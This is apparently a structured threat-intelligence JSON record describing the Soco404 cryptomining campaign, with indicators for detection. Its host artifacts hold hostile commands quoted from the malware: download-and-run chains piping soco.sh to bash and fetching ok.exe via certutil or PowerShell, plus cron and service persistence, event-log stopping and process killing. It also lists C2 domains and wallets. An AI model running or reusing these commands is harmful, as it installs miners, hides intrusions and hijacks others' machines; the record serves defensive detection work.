@@ -1,0 +1,410 @@
+{
+  "malware_family": "Soco404",
+  "threat_actor": "",
+  "platforms": [
+    "linux",
+    "windows"
+  ],
+  "summary": "Soco404 is a multiplatform cryptomining campaign that exploits misconfigured services like PostgreSQL in cloud environments. It uses fake 404 error pages hosted on legitimate services like Google Sites to deliver platform-specific payloads, which then masquerade as system processes and establish persistence. The malware, built with Go and obfuscated with Garble, ultimately executes an XMRig miner.",
+  "mitre_techniques": [
+    "T1105",
+    "T1110.003",
+    "T1562.002",
+    "T1070.002",
+    "T1070.004",
+    "T1036.005",
+    "T1027.002",
+    "T1027.006",
+    "T1055",
+    "T1059.004",
+    "T1559",
+    "T1190",
+    "T1496",
+    "T1543.003",
+    "T1053.003",
+    "T1546.004",
+    "T1583.006",
+    "T1584.004"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "(curl http://<compromised-service>:8080/soco.sh||wget -q -O- http://<compromised-service>:8080/soco.sh||cc http://<compromised-service>:8080/soco.sh||ww -q -O- http://<compromised-service>:8080/soco.sh)|bash",
+      "context": "Initial download and execution of soco.sh on Linux.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "crontab -l | sed '/\\.bashgo\\|pastebin\\|onion\\|bprofr\\|python\\|curl\\|wget\\|\\.sh/d' | crontab -",
+      "context": "soco.sh script removing competing miner cron jobs.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "\\.bashgo\\|pastebin\\|onion\\|bprofr\\|python\\|curl\\|wget\\|\\.sh",
+      "context": "Regex pattern used by soco.sh to find competing cron jobs.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cat /proc/mounts | awk '{print $2}' | grep -P '/proc/\\d+' | grep -Po '\\d+' | xargs -I % kill -9 %",
+      "context": "soco.sh script killing processes in separate mount namespaces.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "exe101",
+      "context": "Base64 payload marker in fake 404 HTML page.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "(sd-pam)",
+      "context": "Masquerading process name for Linux loader.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "[cpuhp/1]",
+      "context": "Masquerading process name for main Linux payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "[kworker/R-rcu_p]",
+      "context": "Masquerading process name for main Linux payload.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/bin/bash -c \"(crontab -l 2>/dev/null; echo \\\"*/1 * * * * /etc/postgresql/<random-binary-name>\\\") | crontab -\"",
+      "context": "Linux persistence cron job creation.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "8BmVXbfsnRsiyPfUxsfnyyA9LqXvUsF2DYBX3wUmCEtejnBMyTiXe3XDCvq4REjmviEc5J1gomsnv7e4wYy1c5Pz3VadeyZ",
+      "context": "Attacker's XMR wallet address used by both payloads.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "wrmsr -a 0xc0011022 0x8680000401570000",
+      "context": "MSR register write for Zen4 CPU optimization in soco.sh.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "wrmsr -a 0xc0011022 0xc000000401500000",
+      "context": "MSR register write for Zen3 CPU optimization in soco.sh.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd /c \"certutil -urlcache -split -f \"http://<compromised-service>:8080/ok.exe\" \"C:\\Users\\Public\\os.exe\" && \"C:\\Users\\Public\\os.exe\" || powershell -c \"iwr 'http://<compromised-service>:8080/ok.exe' -OutFile 'C:\\Users\\Public\\os.exe'; Start-Process 'C:\\Users\\Public\\os.exe'\" || curl -o \"C:\\Users\\Public\\os.exe\" \"http://<compromised-service>:8080/ok.exe\" && \"C:\\Users\\Public\\os.exe\"\"",
+      "context": "Windows initial payload download and execution chain.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\fuekghfebdot\\hunyknsmqtgn.exe",
+      "context": "Copied malware path on Windows.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\blbsihkzkqxm\\wytourcabiik.exe",
+      "context": "Copied malware path on Windows.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sc.exe create \"XXXXXXXX\" binpath= \"C:\\ProgramData\\blbsihkzkqxm\\wytourcabiik.exe\" start= \"auto\"",
+      "context": "Windows persistence via service creation with random 8-char name.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sc.exe stop eventlog",
+      "context": "Stopping Windows event log service.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c choice /C Y /N /D Y /T 3 & Del \"C:\\Users\\Public\\os.exe\"",
+      "context": "Self-deletion of initial Windows payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "WinRing0.sys",
+      "context": "Driver used by cryptominer for low-level access.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "XMRig",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "soco.sh",
+      "context": "Linux dropper script.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "app2",
+      "context": "UPX packed Go binary loader for Linux.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ok.exe",
+      "context": "Initial Windows binary name on C2.",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "483F2xjkCUegxPM7wAexam1Be67EqDRZpS7azk8hcGETSustmuxd1Agffa3XSHFyzeFprLyHKm37bTPShFUTKgctMSBVuuK",
+      "context": "Attacker's crypto wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "www.fastsoco.top",
+      "context": "C2 server hosting main payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://sites.google.com/view/2025soco/",
+      "context": "Google Sites page backing C2 domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/1",
+      "context": "Path for main payload on fastsoco.top C2.",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/soco.sh",
+      "context": "Linux dropper script URL path.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/app2",
+      "context": "Linux Go binary payload URL path.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/ok.exe",
+      "context": "Windows payload URL path.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "dblikes.cyou",
+      "context": "Payload hosting site.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "seeyoume.top",
+      "context": "Payload hosting and crypto scam site.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/sol",
+      "context": "Path on scam site hosting shell script.",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "auto.c3pool.org",
+      "context": "Mining pool domain.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "gulf.moneroocean.stream",
+      "context": "Mining pool domain.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "arcticoins.com",
+      "context": "Associated crypto scam domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "diamondcapitalcrypro.com",
+      "context": "Associated crypto scam domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "nordicicoins.com",
+      "context": "Associated crypto scam domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "hkcapitals.com",
+      "context": "Associated crypto scam domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "c9bb137d56fab7d52b3dbc85ae754b79d861a118bfb99566faaa342c978285ff",
+      "description": "soco.sh dropper script"
+    },
+    {
+      "sha256": "e7fe0a5c6c198be8941d5a1be7c0669688c45751e9bf0d16a0ae6ae1d0e7a957",
+      "description": "ELF malware payload"
+    },
+    {
+      "sha256": "498ecdfce65d739154b39703c63c8f4334066655e1cc8024c2716e280598cacc",
+      "description": "ok.exe Windows malware"
+    },
+    {
+      "sha256": "0086fe6259af25f3b5a12d81080bed61938cc70ebdf480501acc1c10ac39c74a",
+      "description": "os.exe Windows malware"
+    },
+    {
+      "sha256": "11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5",
+      "description": "WinRing0.sys driver"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "elf",
+    "script"
+  ]
+}
